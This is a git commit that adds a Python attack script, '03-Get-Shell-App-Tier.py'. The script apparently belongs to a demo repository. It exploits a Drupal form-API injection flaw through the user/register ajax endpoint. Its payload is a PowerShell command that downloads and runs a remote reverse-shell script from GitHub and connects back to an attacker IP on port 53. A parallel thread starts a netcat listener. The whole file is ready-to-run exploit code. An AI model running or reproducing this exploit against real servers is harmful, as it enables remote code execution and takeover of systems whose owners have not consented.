ceb0022a21e5894a9ed580fdf0a71c7ec56ffafd
mdiminico <markdiminico@gmail.com>
2019-04-09 17:20:45 -0400

    Add files via upload
    initial commit

---
+++ 03-Get-Shell-App-Tier.py
@@ -0,0 +1,33 @@
+#!/usr/bin/python3
+
+import requests
+import base64
+from subprocess import call
+from threading import Thread
+requests.packages.urllib3.disable_warnings() 
+
+target = "http://cords.com/"
+attacker_ip = "10.0.10.214"
+attacker_port = "53"
+
+command = "powershell -c IEX (New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/mdiminico/appd_demo_powershell/master/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress "+attacker_ip+" -Port "+attacker_port
+
+url = target + '/admin/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
+payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': command }
+# print("Sending Payload to: "+target+" ...")
+# call("nc -lvp 53", shell=True)
+# r = requests.post(url, data=payload)
+# print("Payload Sent.")
+
+
+def func1():
+    r = requests.post(url, data=payload, verify=False)
+
+def func2():
+    call("nc -lvp 53", shell=True)
+
+if __name__ == '__main__':
+    Thread(target = func1).start()
+    Thread(target = func2).start()
+
+
